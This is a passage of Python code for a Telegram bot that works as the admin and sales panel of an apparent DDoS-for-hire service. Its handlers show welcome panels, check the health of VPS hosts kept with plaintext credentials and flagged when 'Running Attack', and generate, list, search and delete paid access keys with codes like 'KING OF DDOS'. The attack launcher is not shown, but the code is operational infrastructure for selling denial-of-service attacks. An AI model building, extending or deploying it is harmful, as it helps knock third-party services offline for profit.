        bot.reply_to(message, f"✅ 𝗢𝘄𝗻𝗲𝗿 𝗻𝗮𝗺𝗲 𝘀𝗲𝘁 𝘁𝗼: {message.text} 𝗳𝗼𝗿 𝗴𝗿𝗼𝘂𝗽: {chat.title}")
    except:
        bot.reply_to(message, f"✅ 𝗢𝘄𝗻𝗲𝗿 𝗻𝗮𝗺𝗲 𝘀𝗲𝘁 𝘁𝗼: {message.text}")

# ======================
# 🏠 WELCOME MESSAGE (STYLISH VERSION)
# ======================
@bot.message_handler(commands=['start'])
def welcome(message):
    """Handle /start command with premium styling and user tracking"""
    try:
        # Track all users who interact with the bot
        user_id = str(message.from_user.id)
        user = message.from_user
        
        # Initialize all_users dictionary if not exists
        if 'all_users' not in globals():
            global all_users
            all_users = {}
        
        # Add/update user in tracking
        all_users[user_id] = {
            'first_seen': time.time(),
            'username': user.username,
            'first_name': user.first_name,
            'last_name': user.last_name if user.last_name else "",
            'last_active': time.time(),
            'is_admin': is_admin(user),
            'is_owner': is_owner(user),
            'has_key': user_id in redeemed_users
        }
        save_data()  # Save the updated user data
        
        # Check for referral code
        if len(message.text.split()) > 1:
            referral_code = message.text.split()[1]
            handle_referral(message, referral_code)
        
        now = datetime.datetime.now()
        current_time = now.strftime('%H:%M:%S')
        current_date = now.strftime('%Y-%m-%d')

        chat_id = message.chat.id
        group_settings = GROUP_SETTINGS.get(str(chat_id), {})
        start_image = group_settings.get('start_image', None)
        owner_name = group_settings.get('owner_name', OWNER_USERNAME)

        username = f"@{user.username}" if user.username else user.first_name
        user_info = f"├ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {username}\n└ 𝗨𝘀𝗲𝗿 𝗜𝗗: `{user.id}`"

        if is_owner(user):
            caption = f"""
╭━━━〔 *𝗔𝗗𝗠𝗜𝗡 𝗖𝗘𝗡𝗧𝗘𝗥* 〕━━━╮
*"Master of The Networks" — Access Granted*
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

🛡️ *𝗦𝗧𝗔𝗧𝗨𝗦:* `ADMIN PRIVILEGES GRANTED`  
🎉 Welcome back, Commander *{user.first_name}*

*─────⟪ 𝗦𝗬𝗦𝗧𝗘𝗠 𝗜𝗗𝗘𝗡𝗧𝗜𝗙𝗬 ⟫─────*  
{user_info}

📅 `{current_date}` | 🕒 `{current_time}`  
🔰 *𝗚𝗿𝗼𝘂𝗽 𝗢𝘄𝗻𝗲𝗿:* {owner_name}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶️ *Dashboard Ready — Execute Commands Below*
"""
            markup = create_main_keyboard(message)

        elif user_id in redeemed_users and isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_vip'):
            caption = f"""
╭━━━〔 *𝗩𝗜𝗣 𝗔𝗖𝗖𝗘𝗦𝗦* 〕━━━╮
*"Elite Access Granted" — Welcome Onboard*
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

🌟 *𝗦𝗧𝗔𝗧𝗨𝗦:* `VIP MEMBER`  
👋 Hello, *{user.first_name}*

*─────⟪ 𝗨𝗦𝗘𝗥 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 ⟫─────*  
{user_info}

📅 `{current_date}` | 🕒 `{current_time}`  
🔰 *𝗚𝗿𝗼𝘂𝗽 𝗢𝘄𝗻𝗲𝗿:* {owner_name}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶️ *VIP Panel Ready — Explore Your Powers*
"""
            markup = create_vip_keyboard()

        else:
            caption = f"""
╭━━━〔 *𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗣𝗔𝗡𝗘𝗟* 〕━━━╮
*"Network Access Initiated"*
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯

🚀 *𝗦𝗧𝗔𝗧𝗨𝗦:* `GENERAL ACCESS`  
👋 Hello, *{user.first_name}*

*─────⟪ 𝗨𝗦𝗘𝗥 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 ⟫─────*  
{user_info}

📅 `{current_date}` | 🕒 `{current_time}`  
🔰 *𝗚𝗿𝗼𝘂𝗽 𝗢𝘄𝗻𝗲𝗿:* {owner_name}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶️ Buy special key to unlock VIP features Dm @GODxAloneBoY !
"""
            markup = create_main_keyboard(message)

        if start_image:
            try:
                bot.send_photo(
                    chat_id, 
                    start_image, 
                    caption=caption, 
                    parse_mode="Markdown", 
                    reply_markup=markup
                )
            except Exception as e:
                print(f"Error sending welcome image: {e}")
                bot.send_message(chat_id, caption, parse_mode="Markdown", reply_markup=markup)
        else:
            bot.send_message(chat_id, caption, parse_mode="Markdown", reply_markup=markup)

    except Exception as e:
        print(f"Error in welcome handler: {e}")
        # Fallback simple message if anything goes wrong
        bot.send_message(
            message.chat.id,
            "Welcome to the bot! Please use the menu below:",
            reply_markup=create_main_keyboard(message)
        )

# ======================
# 🖥️ VPS MANAGEMENT (STYLISH VERSION)
# ======================
@bot.message_handler(func=lambda msg: msg.text == "🖥️ 𝙑𝙋𝙎 𝙎𝙏𝘼𝙏𝙐𝙎")
def show_vps_status(message):
    """Show detailed VPS status with premium styling"""
    if not is_owner(message.from_user):
        bot.reply_to(message, "⛔ 𝗢𝗻𝗹𝘆 𝗼𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝗰𝗵𝗲𝗰𝗸 𝗩𝗣𝗦 𝘀𝘁𝗮𝘁𝘂𝘀!")
        return
    
    if not VPS_LIST:
        bot.reply_to(message, "⚠️ 𝗡𝗼 𝗩𝗣𝗦 𝗰𝗼𝗻𝗳𝗶𝗴𝘂𝗿𝗲𝗱 𝗶𝗻 𝘁𝗵𝗲 𝘀𝘆𝘀𝘁𝗲𝗺!")
        return
    
    # Send initial processing message
    msg = bot.send_message(message.chat.id, "🔄 𝗦𝗰𝗮𝗻𝗻𝗶𝗻𝗴 𝗩𝗣𝗦 𝗻𝗲𝘁𝘄𝗼𝗿𝗸...")
    
    # Create loading animation
    for i in range(3):
        try:
            dots = "." * (i + 1)
            bot.edit_message_text(
                f"🔄 𝗦𝗰𝗮𝗻𝗻𝗶𝗻𝗴 𝗩𝗣𝗦 𝗻𝗲𝘁𝘄𝗼𝗿𝗸{dots}",
                message.chat.id,
                msg.message_id
            )
            time.sleep(0.5)
        except:
            pass
    
    status_messages = []
    online_count = 0
    offline_count = 0
    busy_count = 0
    
    # Get list of busy VPS (running attacks)
    busy_vps = [attack['vps_ip'] for attack in running_attacks.values() if 'vps_ip' in attack]
    
    for i, vps in enumerate(VPS_LIST):
        if len(vps) < 3:  # Skip invalid VPS configurations
            continue
            
        ip, username, password = vps[0], vps[1], vps[2]
        
        try:
            # Get detailed health stats
            health = get_vps_health(ip, username, password)
            
            # Determine status emoji
            if ip in busy_vps:
                status_emoji = "🟡"
                status_text = "BUSY (Running Attack)"
                busy_count += 1
            elif health['health_percent'] > 70:
                status_emoji = "🟢"
                status_text = "ONLINE"
                online_count += 1
            elif health['health_percent'] > 30:
                status_emoji = "🟠"
                status_text = "WARNING"
                online_count += 1
            else:
                status_emoji = "🔴"
                status_text = "CRITICAL"
                offline_count += 1
            
            # Create health bar
            health_bar = create_progress_bar(health['health_percent'])
            
            # Format the status message
            status_msg = f"""
🔹 𝗩𝗣𝗦 #{i+1} - {ip}
{status_emoji} 𝗦𝘁𝗮𝘁𝘂𝘀: {status_text}
├ 𝗛𝗲𝗮𝗹𝘁𝗵: {health_bar}
├ 𝗖𝗣𝗨 𝗟𝗼𝗮𝗱: {health['cpu']}
├ 𝗠𝗲𝗺𝗼𝗿𝘆 𝗨𝘀𝗮𝗴𝗲: {health['memory']}
├ 𝗗𝗶𝘀𝗸 𝗨𝘀𝗮𝗴𝗲: {health['disk']}
├ 𝗡𝗲𝘁𝘄𝗼𝗿𝗸: {'✅' if health['network'] else '❌'}
└ 𝗕𝗶𝗻𝗮𝗿𝘆: {'✅' if health['binary_exists'] else '❌'} {'(Executable)' if health['binary_executable'] else ''}
"""
            status_messages.append(status_msg)
            
        except Exception as e:
            status_msg = f"""
🔹 𝗩𝗣𝗦 #{i+1} - {ip}
🔴 𝗦𝘁𝗮𝘁𝘂𝘀: OFFLINE/ERROR
└ 𝗘𝗿𝗿𝗼𝗿: {str(e)[:50]}...
"""
            status_messages.append(status_msg)
            offline_count += 1
    
    # Create summary
    summary = f"""
📊 𝗩𝗣𝗦 𝗦𝘁𝗮𝘁𝘂𝘀 𝗦𝘂𝗺𝗺𝗮𝗿𝘆
🟢 𝗢𝗻𝗹𝗶𝗻𝗲: {online_count}
🟡 𝗕𝘂𝘀𝘆: {busy_count}
🔴 𝗢𝗳𝗳𝗹𝗶𝗻𝗲: {offline_count}
📡 𝗧𝗼𝘁𝗮𝗹 𝗩𝗣𝗦: {len(VPS_LIST)}
⏱ 𝗟𝗮𝘀𝘁 𝗖𝗵𝗲𝗰𝗸: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    
    full_message = summary + "\n" + "\n".join(status_messages)
    
    try:
        # Try to edit the original message
        bot.edit_message_text(
            full_message, 
            message.chat.id, 
            msg.message_id,
            parse_mode="Markdown"
        )
    except:
        # If message is too long or edit fails, send as new messages
        if len(full_message) > 4000:
            # Split into parts
            parts = [full_message[i:i+4000] for i in range(0, len(full_message), 4000)]
            for part in parts:
                bot.send_message(
                    message.chat.id, 
                    part,
                    parse_mode="Markdown"
                )
        else:
            bot.send_message(
                message.chat.id, 
                full_message,
                parse_mode="Markdown"
            )


# ======================
# 🔑 KEY MANAGEMENT (PREMIUM STYLISH VERSION)
# ======================


@bot.message_handler(func=lambda msg: msg.text == "🔐 KEY MANAGER")
def key_management_menu(message):
    """Handle key management menu with premium interface"""
    if not is_admin(message.from_user):
        bot.reply_to(message, 
            "╭━━━〔 ⛔ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Only admins can access this panel!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    bot.send_message(
        message.chat.id,
        "╭━━━〔 🔑 𝗞𝗘𝗬 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧 〕━━━╮\n"
        "│\n"
        "│ Total Keys: {}\n"
        "│ Active Keys: {}\n"
        "│ VIP Keys: {}\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯".format(
            len(keys) + len(vip_keys),
            len([k for k in keys if keys[k]['expiration_time'] > time.time()]),
            len([k for k in vip_keys if vip_keys[k]['expiration_time'] > time.time()])
        ),
        reply_markup=create_key_management_keyboard()
    )

@bot.message_handler(func=lambda msg: msg.text == "✨ GENERATE KEY")
def generate_key_start(message):
    """Start key generation with premium interface"""
    if not is_owner(message.from_user):
        bot.reply_to(message, 
            "╭━━━〔 ⛔ 𝗣𝗘𝗥𝗠𝗜𝗦𝗦𝗜𝗢𝗡 𝗗𝗘𝗡𝗜𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Only the owner can generate keys!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    # Create premium selection menu with more options
    markup = telebot.types.ReplyKeyboardMarkup(row_width=3, resize_keyboard=True)
    normal_buttons = [
        telebot.types.KeyboardButton("10M 🟢 (5 coins)"),
        telebot.types.KeyboardButton("30M 🟡 (8 coins)"),
        telebot.types.KeyboardButton("2H 🔵 (12 coins)"),
        telebot.types.KeyboardButton("5H 🟣 (15 coins)"),
        telebot.types.KeyboardButton("1D 🟠 (20 coins)"),
        telebot.types.KeyboardButton("2D 🔴 (30 coins)"),
        telebot.types.KeyboardButton("1W 💎 (100 coins)")
    ]
    vip_buttons = [
        telebot.types.KeyboardButton("VIP1D ⚡ (50 coins)"),
        telebot.types.KeyboardButton("VIP2D ✨ (80 coins)"),
        telebot.types.KeyboardButton("VIP1W 👑 (200 coins)")
    ]
    custom_button = telebot.types.KeyboardButton("🎛 CUSTOM KEY")
    markup.add(*normal_buttons)
    markup.add(*vip_buttons)
    markup.add(custom_button)
    markup.add(telebot.types.KeyboardButton("❌ CANCEL"))
    
    bot.send_message(
        message.chat.id,
        "╭━━━〔 🔑 𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗜𝗢𝗡 〕━━━╮\n"
        "│\n"
        "│ Select key type and duration:\n"
        "│\n"
        "│ 🟢 Basic Access\n"
        "│ ⚡ VIP Privileges\n"
        "│ 🎛 Custom Duration\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
        reply_markup=markup
    )
    bot.register_next_step_handler(message, process_key_generation)

def process_key_generation(message):
    """Process key generation with premium feedback"""
    if message.text == "❌ CANCEL":
        bot.reply_to(message, 
            "╭━━━〔 🚫 𝗖𝗔𝗡𝗖𝗘𝗟𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Key generation cancelled\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
            reply_markup=create_main_keyboard(message))
        return
    
    if message.text == "🎛 CUSTOM KEY":
        bot.reply_to(message,
            "╭━━━〔 🎛 𝗖𝗨𝗦𝗧𝗢𝗠 𝗞𝗘𝗬 〕━━━╮\n"
            "│\n"
            "│ Enter key details in format:\n"
            "│ <duration><unit> <type>\n"
            "│\n"
            "│ Examples:\n"
            "│ • 30M VIP\n"
            "│ • 2H NORMAL\n"
            "│ • 1D VIP\n"
            "│\n"
            "│ Units: M(minutes), H(hours), D(days), W(weeks)\n"
            "│ Types: VIP or NORMAL\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        bot.register_next_step_handler(message, process_custom_key)
        return
    
    try:
        # Extract duration from button text
        duration_str = message.text.split()[0]
        
        # Handle VIP keys
        if duration_str.startswith("VIP"):
            key_type = "VIP"
            duration_part = duration_str[3:]  # Remove "VIP" prefix
        else:
            key_type = "STANDARD"
            duration_part = duration_str
        
        # Calculate expiration time
        if duration_part.endswith("M"):
            expiry_seconds = int(duration_part[:-1]) * 60
        elif duration_part.endswith("H"):
            expiry_seconds = int(duration_part[:-1]) * 3600
        elif duration_part.endswith("D"):
            expiry_seconds = int(duration_part[:-1]) * 86400
        elif duration_part.endswith("W"):
            expiry_seconds = int(duration_part[:-1]) * 604800
        else:
            raise ValueError("Invalid duration format")
        
        # Generate unique key with premium format
        unique_code = f"{random.choice(['ALONE PAPA', 'KING OF DDOS', 'ALONEBOY LEGEND'])}-{os.urandom(2).hex().upper()}-{int(time.time())%10000:04d}"
        key = f"{key_type}-{duration_str}-{unique_code}"
        
        expiry_time = time.time() + expiry_seconds
        expiry_date = datetime.datetime.fromtimestamp(expiry_time).strftime('%Y-%m-%d %H:%M')
        
        # Store the key
        key_data = {
            'expiration_time': expiry_time,
            'generated_by': str(message.from_user.id),
            'generated_at': time.time(),
            'type': key_type,
            'duration': duration_str,
            'is_vip': key_type == "VIP"
        }
        
        if key_type == "VIP":
            vip_keys[key] = key_data
        else:
            keys[key] = key_data
        
        save_data()
        
        # Create premium response
        response = (
            f"╭━━━〔 ✅ 𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗 〕━━━╮\n"
            f"│\n"
            f"│ 🔑 Key: `{key}`\n"
            f"│ ⏳ Duration: {duration_str}\n"
            f"│ 🚀 Type: {key_type}\n"
            f"│ 📅 Expires: {expiry_date}\n"
            f"│ 👤 Generated by: @{message.from_user.username}\n"
            f"│\n"
            f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
        )
        
        bot.send_message(
            message.chat.id,
            response,
            parse_mode="Markdown",
            reply_markup=create_main_keyboard(message)
        )
        
        # Log to owner if generated by admin
        if not is_owner(message.from_user):
            bot.send_message(
                OWNER_USERNAME,
                f"📝 Key Generation Log\n\n"
                f"• Admin: @{message.from_user.username}\n"
                f"• Key: `{key}`\n"
                f"• Type: {key_type} {duration_str}"
            )
            
    except Exception as e:
        bot.reply_to(message,
            f"╭━━━〔 ❌ 𝗘𝗥𝗥𝗢𝗥 〕━━━╮\n"
            f"│\n"
            f"│ Failed to generate key:\n"
            f"│ {str(e)}\n"
            f"│\n"
            f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")

def process_custom_key(message):
    """Process custom key generation"""
    try:
        parts = message.text.split()
        if len(parts) != 2:
            raise ValueError("Invalid format. Use: <duration><unit> <type>")
            
        duration_str = parts[0]
        key_type = parts[1].upper()
        
        if key_type not in ["VIP", "NORMAL"]:
            raise ValueError("Type must be VIP or NORMAL")
        
        # Calculate expiration time
        if duration_str.endswith("M"):
            expiry_seconds = int(duration_str[:-1]) * 60
            display_duration = f"{duration_str[:-1]} Minutes"
        elif duration_str.endswith("H"):
            expiry_seconds = int(duration_str[:-1]) * 3600
            display_duration = f"{duration_str[:-1]} Hours"
        elif duration_str.endswith("D"):
            expiry_seconds = int(duration_str[:-1]) * 86400
            display_duration = f"{duration_str[:-1]} Days"
        elif duration_str.endswith("W"):
            expiry_seconds = int(duration_str[:-1]) * 604800
            display_duration = f"{duration_str[:-1]} Weeks"
        else:
            raise ValueError("Invalid duration unit (use M, H, D or W)")
        
        # Generate unique key
        unique_code = f"{random.choice(['ALONE', 'KING', 'LEGEND'])}-{os.urandom(2).hex().upper()}-{int(time.time())%10000:04d}"
        key = f"{key_type}-{duration_str}-{unique_code}"
        
        expiry_time = time.time() + expiry_seconds
        expiry_date = datetime.datetime.fromtimestamp(expiry_time).strftime('%Y-%m-%d %H:%M')
        
        # Store the key
        key_data = {
            'expiration_time': expiry_time,
            'generated_by': str(message.from_user.id),
            'generated_at': time.time(),
            'type': key_type,
            'duration': display_duration,
            'is_vip': key_type == "VIP"
        }
        
        if key_type == "VIP":
            vip_keys[key] = key_data
        else:
            keys[key] = key_data
        
        save_data()
        
        # Create response
        response = (
            f"╭━━━〔 ✅ 𝗖𝗨𝗦𝗧𝗢𝗠 𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗 〕━━━╮\n"
            f"│\n"
            f"│ 🔑 Key: `{key}`\n"
            f"│ ⏳ Duration: {display_duration}\n"
            f"│ 🚀 Type: {key_type}\n"
            f"│ 📅 Expires: {expiry_date}\n"
            f"│ 👤 Generated by: @{message.from_user.username}\n"
            f"│\n"
            f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯"
        )
        
        bot.send_message(
            message.chat.id,
            response,
            parse_mode="Markdown",
            reply_markup=create_main_keyboard(message)
        )
        
    except Exception as e:
        bot.reply_to(message,
            f"╭━━━〔 ❌ 𝗘𝗥𝗥𝗢𝗥 〕━━━╮\n"
            f"│\n"
            f"│ Failed to generate custom key:\n"
            f"│ {str(e)}\n"
            f"│\n"
            f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
            reply_markup=create_main_keyboard(message))

@bot.message_handler(func=lambda msg: msg.text == "📜 KEY LIST")
def show_key_list(message):
    """Show list of all active and redeemed keys with premium styling"""
    if not is_admin(message.from_user):
        bot.reply_to(message, 
            "╭━━━〔 ⛔ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Only admins can view key list!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return

    # Helper functions
    def get_username(user_id):
        try:
            user = bot.get_chat(user_id)
            return f"@{user.username}" if user.username else user.first_name
        except:
            return str(user_id)

    def format_time(seconds):
        if seconds < 60:
            return f"{int(seconds)}𝘀"
        elif seconds < 3600:
            return f"{int(seconds//60)}𝗺"
        elif seconds < 86400:
            return f"{int(seconds//3600)}𝗵"
        else:
            return f"{int(seconds//86400)}𝗱"

    current_time = time.time()

    # Prepare sections with premium styling
    sections = []
    
    # 🟢 𝗔𝗖𝗧𝗜𝗩𝗘 𝗞𝗘𝗬𝗦
    active_normal = []
    active_vip = []
    
    for key, details in keys.items():
        try:
            if not isinstance(details, dict) or 'expiration_time' not in details:
                continue
                
            if details['expiration_time'] > current_time:
                generated_by = get_username(details.get('generated_by', 'SYSTEM'))
                key_type = "🟢 𝗡𝗢𝗥𝗠𝗔𝗟" if not details.get('is_vip') else "💎 𝗩𝗜𝗣"
                
                entry = (
                    f"🔹 `{key}`\n"
                    f"├ 𝗧𝘆𝗽𝗲: {key_type}\n"
                    f"├ 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆: {generated_by}\n"
                    f"└ 𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗶𝗻: {format_time(details['expiration_time'] - current_time)}\n"
                )
                
                if details.get('is_vip'):
                    active_vip.append(entry)
                else:
                    active_normal.append(entry)
        except Exception as e:
            print(f"Error processing key {key}: {e}")
            continue
            
    if active_normal:
        sections.append("🍅 𝗔𝗖𝗧𝗜𝗩𝗘 𝗡𝗢𝗥𝗠𝗔𝗟 𝗞𝗘𝗬𝗦:\n" + "\n".join(active_normal))
    if active_vip:
        sections.append("\n🌟 𝗔𝗖𝗧𝗜𝗩𝗘 𝗩𝗜𝗣 𝗞𝗘𝗬𝗦:\n" + "\n".join(active_vip))

    # 🔄 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗 𝗞𝗘𝗬𝗦
    redeemed = []
    for key, details in redeemed_keys_info.items():
        try:
            if not isinstance(details, dict) or 'expiration_time' not in details:
                continue
                
            status = "✅ 𝗔𝗰𝘁𝗶𝘃𝗲" if details['expiration_time'] > current_time else "❌ 𝗘𝘅𝗽𝗶𝗿𝗲𝗱"
            generated_by = get_username(details.get('generated_by', 'SYSTEM'))
            redeemed_by = get_username(details.get('redeemed_by', 'UNKNOWN'))
            
            redeemed.append(
                f"🔓 `{key}`\n"
                f"├ 𝗧𝘆𝗽𝗲: {'💎 𝗩𝗜𝗣' if details.get('is_vip') else '🟢 𝗡𝗼𝗿𝗺𝗮𝗹'}\n"
                f"├ 𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n"
                f"├ 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆: {generated_by}\n"
                f"└ 𝗥𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝗯𝘆: {redeemed_by}\n"
            )
        except Exception as e:
            print(f"Error processing redeemed key {key}: {e}")
            continue
            
    if redeemed:
        sections.append("\n🔑 𝗥𝗘𝗗𝗘𝗘𝗠𝗘𝗗 𝗞𝗘𝗬𝗦:\n" + "\n".join(redeemed))

    if not sections:
        sections.append("ℹ️ 𝗡𝗼 𝗸𝗲𝘆𝘀 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗲 𝘀𝘆𝘀𝘁𝗲𝗺")

    # Create summary header
    summary = (
        "╭━━━〔 🔑 𝗞𝗘𝗬 𝗟𝗜𝗦𝗧 〕━━━╮\n"
        "│\n"
        f"│ 🟢 Active Normal: {len(active_normal)}\n"
        f"│ 💎 Active VIP: {len(active_vip)}\n"
        f"│ 🔄 Redeemed: {len(redeemed)}\n"
        f"│ 📅 Last Updated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n"
    )
    
    full_message = summary + "\n".join(sections)

    # Send with original fonts and copy feature
    bot.send_message(
        message.chat.id,
        full_message,
        parse_mode="Markdown",
        disable_web_page_preview=True
    )

@bot.message_handler(func=lambda msg: msg.text == "🔍 SEARCH KEY")
def search_key_start(message):
    """Start key search process"""
    if not is_admin(message.from_user):
        bot.reply_to(message, 
            "╭━━━〔 ⛔ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Only admins can search keys!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    bot.reply_to(message,
        "╭━━━〔 🔍 𝗞𝗘𝗬 𝗦𝗘𝗔𝗥𝗖𝗛 〕━━━╮\n"
        "│\n"
        "│ Enter key or username to search:\n"
        "│\n"
        "│ Examples:\n"
        "│ • Full key: VIP-1D-ALONE-AB12\n"
        "│ • Partial: ALONE\n"
        "│ • Username: @admin\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
    bot.register_next_step_handler(message, process_key_search)

def process_key_search(message):
    """Process key search with advanced matching"""
    search_term = message.text.strip().upper()
    results = []
    
    # Search in normal keys
    for key, details in keys.items():
        if (search_term in key or 
            search_term in str(details['generated_by']) or 
            search_term in details.get('type', '')):
            results.append(("STANDARD", key, details))
    
    # Search in VIP keys
    for key, details in vip_keys.items():
        if (search_term in key or 
            search_term in str(details['generated_by']) or 
            search_term in details.get('type', '')):
            results.append(("VIP", key, details))
    
    # Search in redeemed keys
    for key, details in redeemed_keys_info.items():
        if (search_term in key or 
            search_term in str(details['redeemed_by']) or 
            search_term in str(details['generated_by'])):
            results.append(("REDEEMED", key, details))
    
    if not results:
        bot.reply_to(message,
            "╭━━━〔 🔍 𝗡𝗢 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 〕━━━╮\n"
            "│\n"
            "│ No keys found matching:\n"
            "│ '{}'\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯".format(search_term))
        return
    
    # Format results
    response = ["╭━━━〔 🔍 𝗦𝗘𝗔𝗥𝗖𝗛 𝗥𝗘𝗦𝗨𝗟𝗧𝗦 〕━━━╯"]
    
    for key_type, key, details in results[:10]:  # Limit to 10 results
        expiry = datetime.datetime.fromtimestamp(details['expiration_time']).strftime('%Y-%m-%d')
        status = "✅ ACTIVE" if details['expiration_time'] > time.time() else "❌ EXPIRED"
        
        if key_type == "REDEEMED":
            redeemed_by = get_username(details['redeemed_by'])
            response.append(
                f"🔹 `{key}`\n"
                f"├ Type: {details.get('type', 'STANDARD')}\n"
                f"├ Status: {status}\n"
                f"├ Redeemed by: {redeemed_by}\n"
                f"└ Expired: {expiry}\n"
            )
        else:
            generated_by = get_username(details['generated_by'])
            response.append(
                f"🔹 `{key}`\n"
                f"├ Type: {key_type}\n"
                f"├ Status: {status}\n"
                f"├ Generated by: {generated_by}\n"
                f"└ Expires: {expiry}\n"
            )
    
    if len(results) > 10:
        response.append(f"\nℹ️ Showing 10 of {len(results)} results")
    
    response.append("╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
    
    bot.reply_to(message, "\n".join(response), parse_mode="Markdown")

@bot.message_handler(func=lambda msg: msg.text == "🗑 DELETE KEY")
def delete_key_start(message):
    """Start key deletion process with confirmation"""
    if not is_admin(message.from_user):
        bot.reply_to(message, 
            "╭━━━〔 ⛔ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 〕━━━╮\n"
            "│\n"
            "│ Only admins can delete keys!\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    bot.reply_to(message,
        "╭━━━〔 🗑 𝗗𝗘𝗟𝗘𝗧𝗘 𝗞𝗘𝗬 〕━━━╮\n"
        "│\n"
        "│ Enter the key to delete:\n"
        "│\n"
        "│ Examples:\n"
        "│ • VIP-1D-ALONE-AB12\n"
        "│ • STANDARD-2H-KING-CD34\n"
        "│\n"
        "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
    bot.register_next_step_handler(message, confirm_key_deletion)

def confirm_key_deletion(message):
    """Confirm key deletion with details"""
    key = message.text.strip().upper()
    found_in = []
    
    if key in keys:
        found_in.append("STANDARD")
    if key in vip_keys:
        found_in.append("VIP")
    if key in redeemed_keys_info:
        found_in.append("REDEEMED")
    
    if not found_in:
        bot.reply_to(message,
            "╭━━━〔 ❌ 𝗞𝗘𝗬 𝗡𝗢𝗧 𝗙𝗢𝗨𝗡𝗗 〕━━━╮\n"
            "│\n"
            "│ This key doesn't exist in:\n"
            "│ • Active keys\n"
            "│ • VIP keys\n"
            "│ • Redeemed keys\n"
            "│\n"
            "╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯")
        return
    
    # Get key details
    if "STANDARD" in found_in:
        details = keys[key]
    elif "VIP" in found_in:
        details = vip_keys[key]
    else:
        details = redeemed_keys_info[key]
    
    expiry = datetime.datetime.fromtimestamp(details['expiration_time']).strftime('%Y-%m-%d')
    status = "✅ ACTIVE" if details['expiration_time'] > time.time() else "❌ EXPIRED"
    
    markup = telebot.types.InlineKeyboardMarkup()
    markup.row(
        telebot.types.InlineKeyboardButton("✅ CONFIRM DELETE", callback_data=f"confirm_delete_{key}"),
        telebot.types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_delete")
    )
    
    bot.reply_to(message,
        f"╭━━━〔 ⚠️ 𝗖𝗢𝗡𝗙𝗜𝗥𝗠 𝗗𝗘𝗟𝗘𝗧𝗜𝗢𝗡 〕━━━╮\n"
        f"│\n"
        f"│ 🔑 Key: `{key}`\n"
        f"│ 🏷 Type: {found_in[0]}\n"
        f"│ 📅 Expiry: {expiry}\n"
        f"│ 🚦 Status: {status}\n"
        f"│\n"
        f"│ This action cannot be undone!\n"
        f"│\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯",
        parse_mode="Markdown",
        reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_delete_'))
def execute_key_deletion(call):
    """Execute key deletion after confirmation"""
    key = call.data.split('_')[-1]
    
    # Delete from all possible locations
    deleted_from = []
    if key in keys:
        del keys[key]
        deleted_from.append("STANDARD")
    if key in vip_keys:
